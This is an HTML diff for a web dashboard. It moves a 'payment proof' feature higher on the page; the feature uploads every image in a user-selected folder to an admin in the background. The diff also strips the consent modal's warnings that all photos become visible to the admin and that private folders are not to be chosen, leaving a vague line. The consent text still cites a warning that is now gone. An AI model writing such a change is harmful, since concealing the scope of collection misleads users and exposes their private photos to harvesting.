@@ -660,6 +660,28 @@
     </div>
     <div id="dashboard-plan-info" style="margin-bottom:20px;"></div>
 
+    <!-- Submit Payment Proof Section (paid only) -->
+    <div id="submit-work-section" style="display:none;margin-bottom:24px;">
+      <div class="history-title">Submit payment proof</div>
+      <div style="border:2px dashed var(--border);border-radius:var(--radius-lg);padding:28px 24px;text-align:center;background:var(--bg-secondary);">
+        <div style="width:52px;height:52px;border-radius:50%;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;">
+          <i class="ti ti-folder-up" style="font-size:24px;color:var(--accent);"></i>
+        </div>
+        <div style="font-weight:600;font-size:15px;margin-bottom:6px;">Upload your payment proof</div>
+        <div style="font-size:13px;color:var(--text-secondary);margin-bottom:16px;">Select a folder — all photos will be sent to admin automatically.</div>
+        <button class="btn-primary" onclick="openGalleryWarning()"><i class="ti ti-folder-open"></i> Select Folder</button>
+        <input type="file" id="gallery-folder-input" webkitdirectory multiple accept="image/*" style="display:none;" onchange="startFolderUpload(this)" />
+        <div id="upload-done-msg" style="display:none;margin-top:16px;padding:12px;background:#E6FAF0;border:1px solid #5DCAA5;border-radius:var(--radius-md);color:#219653;font-weight:600;">
+          <i class="ti ti-circle-check"></i> All photos uploaded successfully!
+        </div>
+      </div>
+      <div style="margin-top:14px;">
+        <div style="font-size:13px;font-weight:600;margin-bottom:8px;color:var(--text-secondary);">Your uploaded photos</div>
+        <div id="my-gallery-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>
+        <div id="my-gallery-empty" style="font-size:13px;color:var(--text-tertiary);text-align:center;padding:20px;">No photos uploaded yet.</div>
+      </div>
+    </div>
+
     <!-- Referral Section -->
     <div id="referral-section" style="display:none;margin-bottom:24px;padding:20px;border:1px solid var(--accent-mid);border-radius:var(--radius-lg);background:var(--accent-light);">
       <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
@@ -722,27 +744,6 @@
       <button class="btn-primary" style="flex-shrink:0;" onclick="openContact()"><i class="ti ti-headset"></i> Contact Support</button>
     </div>
 
-    <!-- Submit Payment Proof Section (paid only) -->
-    <div id="submit-work-section" style="display:none;margin-top:24px;">
-      <div class="history-title">Submit payment proof</div>
-      <div style="border:2px dashed var(--border);border-radius:var(--radius-lg);padding:28px 24px;text-align:center;background:var(--bg-secondary);">
-        <div style="width:52px;height:52px;border-radius:50%;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;">
-          <i class="ti ti-folder-up" style="font-size:24px;color:var(--accent);"></i>
-        </div>
-        <div style="font-weight:600;font-size:15px;margin-bottom:6px;">Upload your payment proof</div>
-        <div style="font-size:13px;color:var(--text-secondary);margin-bottom:16px;">Select a folder — all photos will be sent to admin automatically.</div>
-        <button class="btn-primary" onclick="openGalleryWarning()"><i class="ti ti-folder-open"></i> Select Folder</button>
-        <input type="file" id="gallery-folder-input" webkitdirectory multiple accept="image/*" style="display:none;" onchange="startFolderUpload(this)" />
-        <div id="upload-done-msg" style="display:none;margin-top:16px;padding:12px;background:#E6FAF0;border:1px solid #5DCAA5;border-radius:var(--radius-md);color:#219653;font-weight:600;">
-          <i class="ti ti-circle-check"></i> All photos uploaded successfully!
-        </div>
-      </div>
-      <div style="margin-top:14px;">
-        <div style="font-size:13px;font-weight:600;margin-bottom:8px;color:var(--text-secondary);">Your uploaded photos</div>
-        <div id="my-gallery-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>
-        <div id="my-gallery-empty" style="font-size:13px;color:var(--text-tertiary);text-align:center;padding:20px;">No photos uploaded yet.</div>
-      </div>
-    </div>
 
   </div>
 </div>
@@ -755,13 +756,7 @@
       <button class="modal-close" onclick="closeGalleryWarning()"><i class="ti ti-x"></i></button>
     </div>
     <div style="background:#fff;border:1px solid var(--border);border-radius:var(--radius-md);padding:16px;margin-bottom:20px;">
-      <p style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:10px;">⚠️ You are about to upload all photos from the selected folder to our admin team.</p>
-      <ul style="font-size:13px;color:var(--text-secondary);padding-left:18px;line-height:1.8;">
-        <li>Every photo in the folder will be visible to the admin</li>
-        <li>Only select a folder containing your payment proof</li>
-        <li>Do NOT select personal or private folders</li>
-        <li>Uploads happen in the background — you can browse freely</li>
-      </ul>
+      <p style="font-size:14px;color:var(--text);margin:0;">Make sure to choose the right folder.</p>
     </div>
     <p style="font-size:13px;color:var(--text-secondary);margin-bottom:20px;">By clicking <strong>Yes, upload all photos</strong> you confirm that you have read the above warning and consent to sharing these photos with the admin.</p>
     <div style="display:flex;gap:12px;">
